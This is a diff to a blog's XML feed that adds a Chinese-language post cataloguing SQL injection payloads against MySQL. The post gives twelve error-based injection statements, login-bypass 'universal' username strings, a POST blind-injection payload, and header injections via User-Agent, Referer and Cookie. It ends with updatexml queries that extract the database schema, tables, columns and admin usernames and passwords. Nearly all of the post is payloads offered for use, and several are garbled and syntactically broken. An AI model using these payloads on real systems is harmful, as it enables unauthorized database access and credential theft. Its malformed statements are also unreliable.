@@ -454,6 +454,25 @@
     
     
     <entry>
+      <title>Twelve Types of Error Injection and Universal Statements</title>
+      <link href="/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/"/>
+      <url>/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/</url>
+      
+        <content type="html"><![CDATA[<h2 id="12种报错注入"><a href="#12种报错注入" class="headerlink" title="12种报错注入"></a>12种报错注入</h2><p> 1、通过floor报错,注入语句如下:<br>    and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p><p>2、通过ExtractValue报错,注入语句如下:<br>    and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p><p>3、通过UpdateXml报错,注入语句如下:<br>    and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</p><p>4、通过NAME_CONST报错,注入语句如下:<br>    and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) </p><p>5、通过join报错,注入语句如下:<br>    select * from(select * from mysql.user ajoin mysql.user b)c;   </p><p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p><p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p><p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p><p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p><p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p><p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p><p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p><h2 id="关于POST注入"><a href="#关于POST注入" class="headerlink" title="关于POST注入"></a>关于POST注入</h2><p> 常用的万能username语句：</p><blockquote><p>a ’ or 1&#x3D;1 #<br>a “) or 1&#x3D;1 #<br>a‘) or 1&#x3D;1 #<br>a” or “1”&#x3D;”1<br>‘ or ‘1’&#x3D;’1<br>‘ or (length(database())) &#x3D; 8  (用于输入’ “都没有错误)<br>‘ or (ascii(substr((select database()) ,1,1))) &#x3D; 115 # (用于输入’ “都没有错误)<br>“) or (“1”)&#x3D;(“1<br>“) or 1&#x3D;1 or if(1&#x3D;1, sleep(1), null)  #<br>“) or (length(database())) &#x3D; 8 #<br>“) or (ascii(substr((select database()) ,1,1))) &#x3D; 115  or if(1&#x3D;1, sleep(1), null)  # </p></blockquote><h3 id="post型盲注通杀payload："><a href="#post型盲注通杀payload：" class="headerlink" title="post型盲注通杀payload："></a>post型盲注通杀payload：</h3><p>uname&#x3D;admin%df’or()or%200%23&amp;passwd&#x3D;&amp;submit&#x3D;Submit</p><h2 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h2><p><strong>UPDATEXML,REFERER,COOKIE的构造</strong></p><p>User-Agent:<code>&#39; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Referer: <code> ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</code><br>Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>爆数据库版本信息：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br> 链接用户：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</code><br> 链接数据库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</code><br> 爆库：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆表：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</code><br> 爆字段内容：<code>?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</code></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Vulnerabilities </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Detailed Discussion on information_schema</title>
       <link href="/2019/01/22/Detailed-Discussion-on-information_schema/"/>
       <url>/2019/01/22/Detailed-Discussion-on-information_schema/</url>
